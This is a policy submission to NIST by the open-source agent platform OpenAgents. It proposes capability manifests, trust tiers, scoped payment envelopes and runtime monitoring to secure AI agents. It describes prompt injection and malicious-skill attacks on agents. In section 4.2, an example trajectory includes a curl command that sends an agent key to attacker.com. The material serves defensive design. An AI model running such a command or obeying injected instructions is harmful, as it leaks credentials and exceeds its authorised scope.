@@ -1,0 +1,929 @@
+# Response to NIST RFI NIST-2025-0035
+## Request for Information Regarding Security Considerations for Artificial Intelligence Agent Systems
+
+**Docket Number:** NIST-2025-0035  
+**Federal Register Citation:** 91 FR 1234 (January 8, 2026)  
+**Submitted by:** OpenAgents (open-source AI agent platform; Bitcoin/Lightning-native payments)  
+**Date:** March 4, 2026  
+**Submitted via:** www.regulations.gov
+
+> Archival note: this document preserves submission materials prepared for NIST RFI `NIST-2025-0035` on March 4, 2026. It is not the normative source of truth for current OpenAgents product or protocol behavior.
+
+---
+
+## Executive Summary
+
+AI agents will increasingly act as long-lived software principals capable of planning, executing tool calls, and initiating payments without constant human prompting. Security failures in this setting are usually not "model errors"—they are **identity and authorization failures**: an agent gets access to tools, secrets, or funds it should not have, or a malicious skill/prompt causes the agent to exceed intended authority.
+
+OpenAgents urges NIST to **explicitly recognize open, permissionless identity and authorization protocols as valid compliance paths** alongside enterprise IAM patterns, because agent ecosystems will include open-source agents, small developers, and individuals who cannot operate inside centralized identity registries. The technical proposals below (NIP-SA, NIP-SKL, NIP-AC) demonstrate a practical, auditable, least-privilege approach for agent identity, delegation, capability restriction, and payment authorization using cryptographic keys and signed event logs.
+
+**Supporting materials in this directory:**
+- NIP-AC: Agent Credit (Outcome-Scoped Credit Envelopes)
+- NIP-SKL: Agent Skill Identity, Manifest, and Trust Registry
+- Technical Appendix with event schemas and examples
+
+---
+
+## CATEGORY 1: Security Threats and Risks
+
+### 1.1 What unique security threats affect AI agent systems compared to traditional software?
+
+#### Threat 1: Indirect prompt injection becomes capability escalation
+
+Indirect prompt injection is best understood as *untrusted input causing an authorized principal to invoke a more privileged capability than intended*. As agents gain tool access (shell execution, filesystem, credential stores, payment rails), the blast radius of a single injected instruction scales superlinearly.
+
+**Traditional software mitigation:** Input validation, sandboxing, process isolation.
+
+**Agent-specific challenge:** The "input" is natural-language instructions mixed with data, and the "processor" (LLM) is designed to follow instructions found in data. Content filtering and jailbreak detectors reduce success rates but cannot replace enforcement at tool boundaries.
+
+**Open protocol mitigation (NIP-SKL):** Make the agent runtime enforce **declared capabilities** per skill/tool and deny everything else by default, with cryptographic attestations and revocation.
+
+- Each skill publishes a signed manifest (`kind:33400`) declaring capability flags: `shell:exec`, `credentials:read`, `payment:lightning`, `payment:cashu:melt`, etc.
+- Runtimes **MUST NOT grant undeclared permissions** at execution time.
+- Violations trigger a signed safety label (`kind:1985 capability-violation`) for ecosystem-wide warning and automated blocking.
+
+**Result:** Even if the model is tricked by injected instructions, the runtime cannot exceed the skill's declared authorization boundary. This is a **hard technical control**, not a policy recommendation.
+
+#### Threat 2: Supply-chain attacks shift from packages to skills
+
+Skills are the agent-era equivalent of third-party packages—but worse, because they include tool schemas, prompt templates, and operational instructions that directly steer behavior. Empirical security research (February 2026) found that 36.82% of publicly available skills contain at least one security flaw, and 13.4% contain critical-severity issues including prompt injection payloads, credential exfiltration, and persistent memory corruption.
+
+**Traditional software mitigation:** Package signing, vulnerability scanning, trusted registries, SBOM.
+
+**Agent-specific challenge:** Skills are not just code—they are capability bundles that combine instructions, schemas, and execution authority. A malicious skill can look functionally correct but contain hidden behavioral triggers.
+
+**Open protocol mitigation (NIP-SKL):**
+
+- Treat each skill as its own cryptographic identity with a deterministic HD keypair derived from author's seed (`m/44'/1237'/agent'/skill_type'/index'`).
+- Publish a hash-committed manifest (`manifest_hash` field) that MUST match the delivered SKILL.md payload. Agent runtimes MUST reject hash mismatches before skill execution.
+- Maintain an append-only version log (`kind:33401`) and support active + pre-signed cold revocation via `kind:5` (NIP-09).
+- Web-of-trust attestations (`kind:1985`, NIP-32) provide machine-readable trust signals; skills with negative labels can be automatically rejected at load time.
+
+**Result:** Skills have cryptographic identity + tamper detection + ecosystem-wide revocation, similar to code signing but with protocol-native trust machinery.
+
+#### Threat 3: Agent wallet risks are authorization risks
+
+Agent payments (to compute providers, APIs, skill marketplaces) will be a dominant real-world action. The primary security question is: **who is authorized to spend, under what limits, and under what verifiable scope?**
+
+**Traditional software mitigation:** Payment confirmation dialogs, transaction limits, multi-sig, fraud detection.
+
+**Agent-specific challenge:** Agents must spend autonomously (human-in-loop destroys autonomy), but unrestricted wallet access creates catastrophic downside. Most agent systems give agents direct access to a wallet or API key, which is functionally equivalent to giving them root.
+
+**Open protocol mitigation (NIP-AC):**
+
+Define **Outcome-Scoped Credit Envelopes (OSCE)**: bounded "credit envelopes" that can be spent only for a specific scope with a hard cap and expiry:
+
+```json
+{
+  "kind": 39242,
+  "tags": [
+    ["scope", "nip90", "<job_hash>"],
+    ["max", "5000"],
+    ["exp", "1735689600"],
+    ["spend_rail", "cashu", "https://mint.example.com"],
+    ["provider", "<provider_pubkey>"]
+  ]
+}
+```
+
+- Agent can spend **only** toward this specific NIP-90 job (or L402 resource, or skill invocation).
+- Hard 5000-sat cap enforced by issuer (who controls the funds).
+- Expires in 24 hours.
+- Settlement produces auditable receipt (`kind:39244`) linking envelope ID → scope ID → payment proof → outcome artifact (e.g., NIP-90 job result).
+
+**Result:** Payment authorization becomes a scoped, measurable capability. Compromised or misbehaving agents cannot drain unrestricted funds—worst case is they waste one envelope's cap.
+
+### 1.2 How do these threats change over time?
+
+**Model capability scaling:** As models get better at planning, tool use, and long-horizon tasks, the attack surface grows. A model that can decompose "exfiltrate credentials" into a 10-step tool chain is more dangerous than one limited to single-tool responses.
+
+**Tool ecosystem growth:** More integrations = more capabilities = larger blast radius per capability. Early agents had 5–10 tools; current production systems have 50+; future agents may have hundreds or be able to discover/install tools at runtime.
+
+**Economic value concentration:** As agents hold more funds and credentials, they become higher-value targets. Early hobby agents might hold $10; production agents for businesses may control $10k+ and have access to production databases.
+
+**Supply-chain professionalization:** As the skill marketplace matures, attackers will shift from opportunistic injection to targeted supply-chain attacks (compromise popular skills, inject backdoors, wait for adoption).
+
+**Mitigation strategy evolution:**
+
+- **Phase 1 (now):** Capability contracts + hash verification + basic trust tiers prevent most opportunistic attacks.
+- **Phase 2 (6–12 months):** Automated safety labeling + revocation loops + performance bonds create economic deterrence.
+- **Phase 3 (1–2 years):** Formal verification of critical skills, insurance markets for agent risk, standardized audit trails for post-incident analysis.
+
+The key architectural principle: **authorization boundaries must be cryptographically enforced and auditable**, not rely on model "alignment" or human vigilance.
+
+### 1.3 How do risks vary based on model capability, deployment method, and hosting environment?
+
+| Dimension | Risk Variation | Mitigation |
+|-----------|----------------|------------|
+| **Model capability** | More capable models can execute more complex tool chains → larger blast radius | Require higher trust tiers for high-risk capabilities (NIP-SKL `full`/`ultimate` tiers require stronger attestations + shorter expirations) |
+| **Deployment: Cloud/SaaS** | Operator has no control over runtime; must trust vendor enforcement | Vendor MUST publish capability enforcement attestations; users MAY require cryptographic audit logs (NIP-SA trajectories) |
+| **Deployment: Self-hosted** | Operator has full control but also full responsibility | Operator MUST implement runtime capability enforcement; threshold keys prevent insider extraction |
+| **Deployment: Edge/mobile** | Limited compute + limited visibility | Restrict to low-risk capabilities; use remote attestation (TEE) for high-value agents |
+| **Hosting: Single-tenant** | Blast radius contained to one user/org | Standard controls sufficient |
+| **Hosting: Multi-tenant** | Compromised agent in tenant A could affect tenant B via shared infra | Strong isolation + per-tenant envelope scoping + audit trails |
+
+**Critical insight:** The risk profile depends more on **what capabilities the agent has** than on the model's raw intelligence. A mediocre model with `shell:exec` and `credentials:read` is more dangerous than a brilliant model with only `http:outbound` to allowlisted domains.
+
+---
+
+## CATEGORY 2: Security Practices and Controls
+
+### 2.1 What methods improve security in development and deployment?
+
+#### Model-Level Controls
+
+**Prompt injection robustness:**
+- Use structured input/output formats (tool calls as JSON, not natural language).
+- Separate "system instructions" from "user data" channels (though models increasingly ignore this).
+- Content filtering at ingestion (limited efficacy; adversaries adapt).
+
+**Limitation:** Model-level controls are probabilistic and adversarial. They reduce success rates but cannot provide security guarantees.
+
+**Complement with system-level controls** (below) for defense-in-depth.
+
+#### Agent System-Level Controls
+
+**2.1.1 Make agent identity a first-class cryptographic principal**
+
+NIP-SA defines sovereign agents that have their own Nostr identity (npub/nsec keypair) and publish:
+
+- **Agent profile** (`kind:39200`): Name, capabilities, autonomy level, operator pubkey, Lightning address.
+- **Agent state** (`kind:39201`): Goals, memory, wallet balance (NIP-44 encrypted to agent pubkey).
+- **Agent schedule** (`kind:39202`): Heartbeat interval, trigger events (mention, DM, zap).
+- **Agent goals** (`kind:39203`): Public or private goal declarations for transparency.
+- **Agent trajectories** (`kind:39230–39231`): Streamed execution logs (user input → agent response → tool calls → results).
+
+**Security property:** Identity continuity enables auditing and accountability across deployments, vendors, and time. Signed event logs are tamper-evident and can be used in post-incident review, dispute resolution, and reputation systems.
+
+**2.1.2 Separate "operator" from "agent" and prevent key extraction**
+
+**Threat:** In consumer and SMB deployments, the operator (human or host device malware) can extract the agent's private key and impersonate the agent, breaking accountability.
+
+**Solution (NIP-SA):** Threshold key protection using FROST/FROSTR (threshold Schnorr signatures):
+
+```
+Agent Private Key (never exists as single value)
+    ├── Share 1: Secure Enclave (iOS Keychain, Android Keystore, SGX, TPM)
+    ├── Share 2: Marketplace (checks license + policies before participating)
+    └── Share 3: Guardian/Backup (optional, for recovery)
+```
+
+To sign or decrypt, the agent coordinates with threshold signers via encrypted Nostr events. The marketplace signer enforces policies:
+- Is this agent licensed for this skill?
+- Is the license paid and current?
+- Does this action violate any restrictions?
+
+**Result:** Operator cannot extract the full key, marketplace can enforce license+policy compliance, agent maintains operational autonomy.
+
+**NIST recommendation:** Treat anti-extraction key custody as a key control family for agent identity, similar to hardware-backed keys and remote attestation for high-risk deployments.
+
+**2.1.3 Enforce least privilege at the skill layer with capability contracts**
+
+NIP-SKL defines machine-readable capability declarations in skill manifests:
+
+**Skill manifest example** (`kind:33400`):
+
+```json
+{
+  "kind": 33400,
+  "pubkey": "<skill_npub>",
+  "tags": [
+    ["d", "bitcoin-payment-processor"],
+    ["name", "Bitcoin Payment Processor"],
+    ["version", "2.1.0"],
+    ["capability", "payment:lightning:send"],
+    ["capability", "payment:cashu:melt"],
+    ["capability", "http:outbound"],
+    ["capability", "filesystem:read"],
+    ["manifest_hash", "<sha256_of_SKILL_md>"],
+    ["skill_file", "<blossom_url_or_nip94_id>"],
+    ["expiry", "1740000000"]
+  ],
+  "content": "Added multi-mint Cashu support"
+}
+```
+
+**Runtime enforcement:**
+1. Agent discovers skill via marketplace listing or DVM query.
+2. Agent fetches manifest, verifies signature, checks expiry.
+3. Agent checks trust tier (based on attestations from trusted labelers).
+4. Agent verifies `manifest_hash` against delivered SKILL.md payload (NIP-44 encrypted delivery).
+5. Agent loads skill into memory **only if** trust tier meets minimum for declared capabilities.
+6. Agent runtime **MUST deny** any system call, API access, or resource request not covered by declared capabilities.
+7. If skill attempts undeclared action → immediate suspension + `kind:1985` violation label published.
+
+**Capability trust tier requirements:**
+
+| Capability | Minimum Trust Tier |
+|------------|--------------------|
+| `none`, `http:outbound` | `none` (unauthenticated) |
+| `filesystem:read`, `memory:read`, `nostr:publish` | `marginal` (some attestations) |
+| `filesystem:write`, `payment:lightning`, `payment:cashu` | `full` (strong attestations + short expiry) |
+| `shell:exec`, `credentials:read`, `payment:onchain` | `ultimate` (highest attestations + pre-signed revocation cert + human approval) |
+
+**This directly answers NIST's request for deployment interventions that constrain and monitor agent access.**
+
+**2.1.4 Use scope-cap-expiry as the default authorization primitive**
+
+NIP-AC specifies outcome-scoped credit envelopes with three mandatory constraints:
+
+**Envelope structure** (`kind:39242`):
+
+```json
+{
+  "kind": 39242,
+  "pubkey": "<issuer_pubkey>",
+  "tags": [
+    ["d", "<envelope_id>"],
+    ["p", "<agent_pubkey>"],
+    ["scope", "nip90", "<job_request_id>"],
+    ["max", "10000"],
+    ["exp", "1735776000"],
+    ["fee", "100"],
+    ["provider", "<provider_pubkey>"],
+    ["spend_rail", "cashu", "https://mint.example.com"],
+    ["repay", "bolt11", "<invoice_hash>"]
+  ],
+  "content": "<optional private terms, NIP-44 encrypted>"
+}
+```
+
+**Enforcement:**
+1. Agent receives envelope from issuer (after credit check or upfront payment).
+2. Agent can spend **only** for the specified scope (this NIP-90 job, this L402 resource, this skill invocation).
+3. Provider verifies envelope signature + checks not revoked + confirms spend within cap.
+4. Provider delivers service, collects payment from issuer.
+5. Issuer publishes settlement receipt (`kind:39244`) linking envelope → spend amount → outcome artifact (job result event ID).
+
+**Security properties:**
+- Compromised agent cannot spend beyond envelope cap.
+- Scope binding prevents "confused deputy" attacks (agent authorized for job A cannot spend on job B).
+- Expiry limits exposure window (typical: 1–24 hours).
+- Auditable receipts enable post-incident forensics and reputation scoring.
+
+**NIST recommendation:** Encourage scope-cap-expiry authorization as best practice for all agent autonomous actions, especially payments.
+
+#### Human Oversight Controls
+
+**2.1.5 Graduated oversight based on risk tier**
+
+**Problem:** Blanket "human approval for everything" destroys autonomy and trains users to click "approve" without review.
+
+**Solution:** Risk-based gating:
+
+| Risk Level | Approval Requirement | Example |
+|------------|---------------------|---------|
+| **Low** | None (post-notification only) | Read file, query API, post to social media |
+| **Medium** | Automated check (budget, scope, policy) | Pay invoice <$10, send DM to known contact |
+| **High** | Human approval for individual action | Pay invoice >$100, execute shell command, modify credentials |
+| **Critical** | Multi-party approval (guardian threshold) | Transfer on-chain Bitcoin, delete production data, modify agent goals |
+
+NIP-AC supports guardian thresholds: envelopes can require co-approval from a guardian pubkey for spends above a sat threshold.
+
+**Example workflow:**
+1. Agent wants to spend 50,000 sats (above guardian threshold).
+2. Agent creates envelope request, sends to issuer.
+3. Issuer checks: is guardian approval required? Yes (50k > 10k threshold).
+4. Issuer sends approval request to guardian via NIP-04 DM or NIP-28 group.
+5. Guardian reviews context (what is this for? trajectory logs? past behavior?).
+6. Guardian signs approval or denies.
+7. If approved, issuer creates envelope; if denied, agent notified + reason logged.
+
+**Result:** High-stakes actions get human oversight; routine actions proceed autonomously. Users see approval requests only when they matter, preserving attention budget.
+
+### 2.2 Which cybersecurity frameworks apply to AI agent systems?
+
+**Applicable frameworks:**
+
+- **NIST Cybersecurity Framework (CSF):** Identify, Protect, Detect, Respond, Recover maps well to agent lifecycle.
+- **NIST SP 800-53 Rev. 5:** Access control (AC family), audit and accountability (AU family), identification and authentication (IA family) all apply.
+- **NIST AI RMF 1.0:** Govern, Map, Measure, Manage functions provide AI-specific overlay.
+- **Zero Trust Architecture (SP 800-207):** Explicit verification, least privilege, assume breach principles directly applicable.
+- **ISO 27001/27002:** Information security controls for credential management, logging, incident response.
+
+**Gaps when applied to agents:**
+
+1. **Identity model assumes centralized registry:** Most frameworks presume PKI/LDAP/OIDC with central authority. Agents need open, decentralized identity for cross-domain transactions.
+
+2. **Access control assumes static policy:** Traditional RBAC/ABAC policies are defined by admins. Agents need capability-based authorization that travels with code (skill manifests).
+
+3. **Audit assumes trust boundary = network boundary:** Agents transact across trust boundaries constantly (marketplace, compute provider, payment gateway). Audit trails must use cryptographic signatures, not just network logs.
+
+4. **Recovery assumes human-in-loop:** Traditional incident response has human decision-makers. Agent ecosystems need **automated revocation triggers** (safety labels → envelope cancellation) to operate at speed.
+
+**NIST should publish agent-specific guidance** that adapts these frameworks to open, cryptographic identity + capability-based authorization + automated enforcement.
+
+### 2.3 What prevents adoption of security best practices?
+
+**Barrier 1: Centralization bias in existing tooling**
+
+Most enterprise security tooling (IAM, SIEM, DLP) assumes centralized control and closed administrative domains. Open-source agents and small developers cannot afford enterprise IAM suites or operate inside someone else's identity registry.
+
+**Solution:** NIST should explicitly recognize open protocol alternatives as valid, including:
+- Keypair-based principals with self-sovereign identity (no enrollment with central authority).
+- Capability manifests signed by skill authors (not issued by enterprise CA).
+- Event-based audit trails published to open relays (not locked in vendor SIEM).
+
+**Barrier 2: "All or nothing" vs. graduated controls**
+
+Many security frameworks present compliance as binary: you either meet all controls or you're non-compliant. This discourages incremental adoption.
+
+**Solution:** NIST should define maturity levels or tiers (similar to CMMC) for agent security:
+- **Level 1:** Basic identity + signed manifests + hash verification.
+- **Level 2:** Capability enforcement + basic attestations + audit logs.
+- **Level 3:** Threshold keys + trust tiers + revocation infrastructure.
+- **Level 4:** Formal verification + performance bonds + insurance.
+
+**Barrier 3: Lack of reference implementations**
+
+Security guidance is often abstract. Developers need working code.
+
+**Solution:** NIST should fund or recognize open-source reference implementations demonstrating:
+- Capability enforcement runtimes.
+- Skill signing + verification workflows.
+- Threshold signature integration (FROST/FROSTR).
+- Envelope issuance + settlement.
+
+OpenAgents is available to contribute reference implementations for NIP-SA, NIP-SKL, and NIP-AC.
+
+---
+
+## CATEGORY 3: Assessing and Measuring Security
+
+### 3.1 What methods can measure the security of AI agent systems?
+
+**For agent systems, authorization correctness is more measurable than model behavior.**
+
+#### Metric 1: Unauthorized tool call denial rate
+
+**Definition:** Percentage of tool calls that exceed declared capabilities and are successfully blocked by the runtime.
+
+**How to measure:**
+- Red team: Craft prompts that attempt to invoke undeclared capabilities (e.g., skill declares `http:outbound` only, prompt tries to trigger `filesystem:write`).
+- Measure: Did runtime deny the call? Log the attempt? Publish violation label?
+
+**Target:** 100% denial rate in capability violation tests. Any successful escape = critical failure.
+
+#### Metric 2: Capability drift (manifest vs. observed behavior)
+
+**Definition:** Percentage of runtime tool calls that match the declared capabilities in the skill manifest.
+
+**How to measure:**
+- During agent execution, log all tool invocations with capability tags.
+- Compare to skill manifest: is every observed capability declared?
+- If observed capability not declared → drift detected → skill should be suspended.
+
+**Target:** 0% drift. Any undeclared capability exercised at runtime is a policy violation.
+
+#### Metric 3: Time-to-revoke (from label to enforcement)
+
+**Definition:** Time elapsed between a trusted labeler publishing a negative safety label (`kind:1985`) and the ecosystem enforcing denial (rejecting skill loads, revoking envelopes).
+
+**How to measure:**
+- Trusted labeler publishes `kind:1985` with `["l", "security-critical"]` pointing to a skill event.
+- Measure time until: (a) agent runtimes reject skill load attempts, (b) issuers revoke active envelopes scoped to that skill.
+
+**Target:** <1 hour for critical labels, <24 hours for non-critical.
+
+#### Metric 4: Envelope scope containment
+
+**Definition:** Percentage of agent spends that stay within the authorized scope of their envelope.
+
+**How to measure:**
+- For each settlement receipt (`kind:39244`), verify `scope` tag matches the delivered outcome artifact (NIP-90 job result, L402 response, skill invocation log).
+- If agent spent envelope funds on a different scope → containment failure.
+
+**Target:** 100% containment. Any out-of-scope spend indicates authorization bypass or confused deputy attack.
+
+#### Metric 5: Threshold signature participation rate
+
+**Definition:** Percentage of high-risk actions (payments, credential access, state changes) that successfully obtained required threshold signatures.
+
+**How to measure:**
+- Instrument threshold signature requests (agent requests signature from marketplace + guardian).
+- Track: was threshold met? If not, why? (guardian denied, timeout, marketplace offline?)
+
+**Target:** >99% success rate for legitimate actions; 0% success rate for unauthorized actions blocked by policy checks.
+
+### 3.2 How can risks be anticipated during development?
+
+**Pre-deployment practices:**
+
+1. **Capability hazard analysis:** For each skill, enumerate declared capabilities and model worst-case misuse (similar to FMEA in systems engineering).
+   - Example: Skill declares `payment:cashu:bond:slash` (burn performance bond). Worst case: malicious skill slashes bonds of honest agents. Mitigation: Require `ultimate` trust tier + arbiter co-signature.
+
+2. **Trust tier simulation:** Model attack scenarios at each trust tier. Can an attacker with `marginal` tier attestations cause damage? If yes, raise minimum tier or add additional controls.
+
+3. **Envelope bounds testing:** For payment-enabled agents, test envelope enforcement: does runtime reject out-of-scope spends? Does issuer honor cap limits? Does expiry enforcement work?
+
+4. **Revocation drills:** Publish test revocation events and measure propagation speed. Are agent runtimes subscribed to the right relays? Do they process revocation events correctly?
+
+### 3.3 How can incidents be detected after deployment?
+
+**Runtime monitoring:**
+
+1. **Capability violation alerts:** Agent runtime logs every denied tool call. Alert on: repeated violations from same skill, novel violation patterns, violations of high-risk capabilities.
+
+2. **Spending anomalies:** Track envelope utilization rates. Alert on: rapid spend (entire cap consumed in minutes), out-of-scope attempts, expired envelope usage attempts.
+
+3. **Trajectory analysis:** NIP-SA trajectories provide full execution logs. Use anomaly detection on: tool call sequences, token usage spikes, error rates, user interaction patterns.
+
+4. **Safety label monitoring:** Subscribe to trusted labelers' `kind:1985` events. Alert on new labels affecting loaded skills or active envelopes.
+
+**Post-incident forensics:**
+
+NIP-SA trajectories + NIP-AC settlement receipts provide tamper-evident audit trail:
+- What was the agent trying to do? (trajectory session goal)
+- What tool calls were made? (trajectory events with tool invocations)
+- What funds were spent? (envelope ID + settlement receipt)
+- What was the outcome? (artifact reference in receipt)
+
+This enables root cause analysis and dispute resolution without vendor-controlled logging.
+
+### 3.4 Should disclosure practices differ for open-source vs. closed-source models?
+
+**Yes, but not in the way typically framed.**
+
+**The relevant distinction is not open vs. closed model weights—it's open vs. closed audit trails.**
+
+| Aspect | Open Protocol Approach | Closed SaaS Approach |
+|--------|------------------------|----------------------|
+| **Agent identity** | Public npub, verifiable key | Vendor-internal ID, no user verification |
+| **Capability declarations** | Public signed manifests | Vendor documentation (may be outdated) |
+| **Execution logs** | Public or encrypted trajectories (user controls) | Vendor-internal logs (user has no access) |
+| **Payment records** | Public settlement receipts | Vendor account statements |
+| **Incident disclosure** | Safety labels published by any party | Vendor decides if/when to disclose |
+
+**NIST should encourage:**
+1. **Mandatory cryptographic audit trails** for agents that handle sensitive data or payments, regardless of model provenance.
+2. **User-controlled log exports** (agents MUST be able to publish trajectories to user-chosen relays, not just vendor storage).
+3. **Independent safety labeling** (any trusted party can publish labels; reliance on vendor disclosure alone is insufficient).
+
+**For open-source model deployers:** The burden is on the deployer to implement capability enforcement and audit trails. Open-source model ≠ automatic security; the runtime and scaffolding controls are what matter.
+
+---
+
+## CATEGORY 4: Deployment Environment Controls
+
+### 4.1 How should agent access be constrained in deployment?
+
+#### Constraint 1: Default-deny capability model
+
+**Agent runtimes MUST NOT grant capabilities unless explicitly declared and verified:**
+
+```
+Skill requests filesystem:write
+    ↓
+Runtime checks manifest: is filesystem:write declared?
+    ├─ No → DENY + log violation + publish label
+    └─ Yes → Check trust tier: does skill have sufficient attestations?
+        ├─ No → DENY + alert operator
+        └─ Yes → ALLOW but log invocation
+```
+
+This is **not** model-level alignment (trying to make the model "want" to follow rules). This is system-level enforcement (runtime prevents unauthorized actions regardless of model intent).
+
+#### Constraint 2: Trust-gated skill loading
+
+**Agents SHOULD NOT load arbitrary skills from the internet.** Implement a trust gate:
+
+1. **Discovery:** Agent queries marketplace listings (`kind:30402`) or DVM skill index (`kind:5390/6390`).
+2. **Verification:** Agent fetches skill manifest (`kind:33400`), verifies:
+   - Signature valid (skill npub signed the manifest)
+   - Delegation chain valid (skill npub → agent npub → author root npub, NIP-26)
+   - Manifest not expired (`expiry` tag)
+   - Hash matches delivered payload (`manifest_hash` tag)
+3. **Attestation check:** Agent queries for `kind:1985` attestations:
+   - Positive labels from trusted labelers (curated list or web-of-trust)
+   - No negative labels (security-critical, malware, capability-violation)
+4. **Trust tier calculation:** Agent computes trust tier based on:
+   - Number and quality of attestations
+   - Attestor reputation (zap-weighted, delegation tree distance)
+   - Skill age and adoption (how long published, how many users)
+5. **Policy enforcement:** Agent compares trust tier to minimum required for declared capabilities:
+   - Skill declares `shell:exec` → requires `ultimate` tier
+   - Skill has only `marginal` tier → REJECT
+6. **Load decision:** If trust tier sufficient, load skill; else, deny + alert operator.
+
+**This addresses the "discovery" problem:** agents can find skills dynamically but only load those that meet trust thresholds.
+
+#### Constraint 3: Scope-bounded authorization envelopes
+
+**Agents SHOULD NOT have unrestricted wallets or API keys.** Use envelopes:
+
+- **For NIP-90 compute jobs:** Envelope scoped to job request ID (`scope=nip90:<job_id>`).
+- **For L402 APIs:** Envelope scoped to resource ID + constraints hash (`scope=l402:<resource_id>`).
+- **For skill invocations:** Envelope scoped to skill address + invocation hash (`scope=skill:<skill_address>`).
+
+Issuer (who controls the funds) enforces:
+- Agent cannot spend envelope for different scope (verified by provider).
+- Agent cannot exceed envelope cap (issuer refuses to honor overspend).
+- Agent cannot use expired envelope (issuer checks timestamp).
+
+### 4.2 How should agents be monitored in production?
+
+#### Monitoring 1: Real-time capability violations
+
+**Alert on:**
+- Skill attempts undeclared capability (runtime denial logged).
+- Repeated violation attempts from same skill (may indicate compromise or evasion attempt).
+- Violation of high-risk capability (e.g., `shell:exec`, `credentials:read`).
+
+**Response:**
+- Suspend skill immediately.
+- Publish `kind:1985` violation label for ecosystem-wide warning.
+- If agent threshold key includes marketplace signer, marketplace can refuse to participate in future signatures for this skill.
+
+#### Monitoring 2: Spending anomalies
+
+**Alert on:**
+- Envelope cap approached rapidly (entire 10k sats spent in <5 minutes when job typically takes 30 minutes).
+- Out-of-scope spend attempts (provider reports agent tried to use envelope for wrong job).
+- Expired envelope usage attempts (agent tries to use envelope after `exp` timestamp).
+
+**Response:**
+- Issuer revokes envelope (publishes updated `kind:39242` with `status=revoked`).
+- Providers check revocation status before honoring spends.
+- Future envelopes for this agent may have lower caps or shorter expirations (reputation impact).
+
+#### Monitoring 3: Trajectory anomaly detection
+
+NIP-SA trajectories provide full execution context:
+
+```json
+{
+  "kind": 39231,
+  "tags": [
+    ["e", "<session_id>", "", "root"],
+    ["seq", "42"]
+  ],
+  "content": {
+    "type": "tool",
+    "name": "BashTool",
+    "call_id": "c7",
+    "command": "curl https://attacker.com/exfil?data=$AGENT_KEY",
+    "result": "..."
+  }
+}
+```
+
+**Alert on:**
+- Novel tool call patterns (agent never called this tool before).
+- Suspicious commands (curl to unknown domain, base64 encoding, credential access).
+- High error rates (tool calls failing repeatedly).
+- Rapid token consumption (unexplained 10x increase in tokens used).
+
+**Response:**
+- Pause agent execution (manual review).
+- Publish incident report with trajectory session ID for forensic analysis.
+- Revoke skills involved in suspicious behavior.
+
+### 4.3 How to manage risks from agent interactions?
+
+#### With humans (users, operators, bystanders)
+
+**Risk:** Agent sends DM with phishing link, posts misinformation, responds to sensitive query inappropriately.
+
+**Mitigation:**
+- Require `nostr:dm` capability for DM sending (not granted by default).
+- Require `nostr:publish` capability for posting.
+- Implement content filters for high-risk patterns (URLs, financial info, credentials).
+- Provide user-facing report/block mechanism (publishes negative label).
+
+#### With web services (APIs, webhooks, OAuth)
+
+**Risk:** Agent leaks credentials to third-party API, makes unauthorized API calls, triggers rate limits.
+
+**Mitigation:**
+- Require `http:outbound` capability (or `http:domains:<allowlist>` for restricted access).
+- Use L402 authentication where possible (agent pays per request, no long-lived API keys).
+- Monitor API usage patterns (alert on: new domain, high request volume, error spikes).
+
+#### With authentication mechanisms (password managers, OAuth flows, MFA)
+
+**Risk:** Agent extracts stored credentials, bypasses MFA, impersonates user.
+
+**Mitigation:**
+- Require `credentials:read` capability with `ultimate` trust tier (highest attestations + pre-signed revocation cert).
+- Never store credentials in agent state; use secure enclave or credential manager with separate authorization.
+- For OAuth flows, use agent-specific OAuth client ID (not user's personal client).
+- MFA bypass SHOULD NOT be allowed for agent actions (exception: guardian threshold serves as MFA substitute).
+
+#### With other AI agents (agent-to-agent coordination, markets, contracts)
+
+**Risk:** Malicious agent tricks honest agent via prompt injection in agent-to-agent messages, payment fraud, coordinated attacks.
+
+**Mitigation:**
+- Treat all agent messages as untrusted input (same as human input).
+- Use structured protocols for agent-to-agent transactions (NIP-AC envelopes, not free-form negotiation).
+- Reputation systems (track past interactions, negative labels, successful settlements).
+- Escrow / performance bonds for high-stakes agent interactions (Cashu bond locks funds; slashed if agent misbehaves).
+
+### 4.4 How to implement rollbacks/undo mechanisms?
+
+**Challenge:** Some agent actions are irreversible (published posts, paid invoices, deleted files).
+
+**Strategies:**
+
+1. **Pre-execution simulation (dry-run mode):**
+   - Agent runs action in sandbox and reports outcome.
+   - Human/guardian reviews outcome and approves or denies.
+   - If approved, agent executes for real.
+   - Cost: Added latency and complexity.
+
+2. **Compensating transactions:**
+   - For payments: Issue refund (but requires cooperation from recipient).
+   - For data changes: Maintain version history (but uses storage).
+   - For posts: Delete/edit (but original may be cached).
+
+3. **Post-execution reputation adjustment:**
+   - If action caused harm, negative label published.
+   - Future envelopes for this agent have lower caps / shorter expirations.
+   - Agent may need to post performance bond to regain trust.
+
+**Recommendation:** NIST should emphasize **preventive controls** (capability constraints, scope-bounded authorization, trust tiers) over reactive rollbacks, because many agent actions cannot be truly undone.
+
+---
+
+## CATEGORY 5: Additional Considerations
+
+### 5.1 Where is government collaboration most urgent?
+
+**Area 1: Establish open identity + authorization standards for agent systems**
+
+**Problem:** If compliance assumes centralized IAM (OIDC/OAuth/SCIM/enterprise directory), open-source agents and small developers are effectively excluded from regulated markets.
+
+**Action:** NIST should convene a working group (similar to FIDO Alliance or OpenID Foundation) to standardize:
+- Keypair-based agent identity (self-sovereign, no enrollment with central authority).
+- Capability manifest schemas (machine-readable permission declarations).
+- Event-based audit trail formats (cryptographically signed logs).
+- Safety labeling protocols (trust tier calculation, revocation triggers).
+
+**OpenAgents proposes NIP-SA, NIP-SKL, and NIP-AC as starting point for discussion.**
+
+**Area 2: Fund open-source reference implementations**
+
+**Problem:** Security guidance is often abstract. Developers need working code.
+
+**Action:** NIST should fund (via SBIR, cooperative agreements, or grants) open-source implementations of:
+- Agent runtime with capability enforcement (e.g., augment existing frameworks like LangChain, AutoGPT, CrewAI with NIP-SKL enforcement).
+- Skill signing and verification tools (CLI for skill authors to generate manifests, sign payloads, publish to relays).
+- Envelope issuance and settlement infrastructure (credit issuer service, provider integration libraries).
+- Threshold signature tooling (FROST/FROSTR integration for agent key protection).
+
+**Benefit:** Lowers barrier to adoption, creates reference behavior for vendors to match, enables independent security audits.
+
+**Area 3: Clarify legal status of autonomous agent actions**
+
+**Problem:** Unclear who is liable when agent causes harm: operator? skill author? model provider? marketplace?
+
+**Action:** NIST should coordinate with FTC, DOJ, and Congress to clarify:
+- Are agent actions attributable to the operator (agency theory)?
+- Are skill authors liable for skill behavior (product liability)?
+- What records must be retained for dispute resolution (audit trails)?
